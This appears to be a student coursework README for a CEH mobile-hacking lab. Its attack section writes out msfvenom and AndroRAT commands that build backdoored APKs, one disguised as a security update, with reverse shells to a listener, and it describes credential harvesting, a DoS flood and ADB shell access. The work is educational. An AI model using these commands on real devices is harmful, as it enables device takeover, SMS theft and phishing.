Overview
This repository contains the complete documentation and lab work for Module 17: Hacking Mobile Platforms, part of the CEH v12 program. Our group conducted ethical hacking simulations on Android platforms, exploring both attack vectors and defensive strategies.

Group Information
Group Members:
Muhammad Shaheem (Student ID: 2023507)
Shayan Siddique (Student ID: 2023656)
Zulqamain Umar (Student ID: 2023556)

Course Details:
Course: CY201 - Cyber Security Principles and Concepts
Instructor: Mr. Abdullah Bin Zarshaid
Submission Date: 14 May 2025

Module Objectives
The module covered both offensive and defensive aspects of mobile security:
Offensive Techniques:
  Creating and deploying malicious APKs using tools like msfvenom and AndroRAT
  Exploiting Android devices through ADB using PhoneSploit
  Conducting social engineering attacks with SET
  Performing DoS attacks with LOIC
Defensive Strategies:
  Analyzing APKs for vulnerabilities using SISIK analyzer
  Detecting malware with Malwarebytes
  Monitoring network traffic using Wireshark

Detailed Lab Work
Lab 01: Attack Simulations
  Task 1: Binary Payload with Metasploit
    We created a backdoored APK and established Meterpreter session using these commands:
      msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.3 LPORT=4444 -o Backdoor.apk
      use exploit/multi/handler
      set payload android/meterpreter/reverse_tcp
      set LHOST 192.168.10.3
      set LPORT 4444
      exploit -j -z

  Task 2: Social Engineering with SET
    We cloned a hotel booking site to harvest credentials using:
    setoolkit
      Selected credential harvester attack method
      Configured with IP 10.10.1.13 and cloned http://certifiedhacker.com/Online%20Booking/index.htm

  Task 3: DoS Attack with LOIC
    We performed a TCP flood attack on target 10.0.2.15 port 80 with 100 threads, monitored using Wireshark.

  Task 4: ADB Exploitation with PhoneSploit
    We gained shell access to an Android device using:
      python3 phonesploitpro.py
      Connected to target device IP 10.10.1.14
      Accessed shell and executed commands like ls, cd, and ran apps remotely.

  Task 5: APK Backdoor with AndroRAT
    We created a malicious APK and established remote control:
      python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
      python3 androRAT.py --shell -i 0.0.0.0 -p 4444
      Exfiltrated SMS, MAC address, and device info.

Lab 02: Defense and Analysis
  Task 1: APK Analysis with SISIK
    Analyzed communicationstage.apk revealing:
      Min SDK: API 10 (Android 2.3.3)
      Target SDK: API 17 (Android 4.2)
      Version: 1.0

  Task 2: Malware Detection with Malwarebytes
    Scanned device detecting:  
      LOIC_v1.3.apk as suspicious
      Protection score: 32/100 (Poor)

-> Key Findings and Lessons
  Critical Vulnerabilities Identified:
    Outdated Android OS versions without security patches
    Exposed ADB ports allowing unauthorized access
    Effectiveness of social engineering attacks
    Risks of sideloading APKs from untrusted sources
  Defensive Recommendations:
    Regular OS and security updates
    Disabling "Unknown Sources" for APK installation
    Network monitoring for unusual traffic
    User education about phishing risks
  Ethical Considerations
    All tests were conducted in a controlled lab environment with proper authorization. These techniques should only be used for legitimate security testing     purposes with explicit permission.

->Repository Structure
  The repository contains:
    Complete lab report PDF with detailed methodologies
    Screenshots documenting our processes and results
    Command references for all lab tasks
    This README file summarizing our work
  How to Use This Repository
    Review the full report for comprehensive understanding
    Refer to command references for technical details
    Note all activities must be conducted ethically and legally
    Never execute these techniques without proper authorization
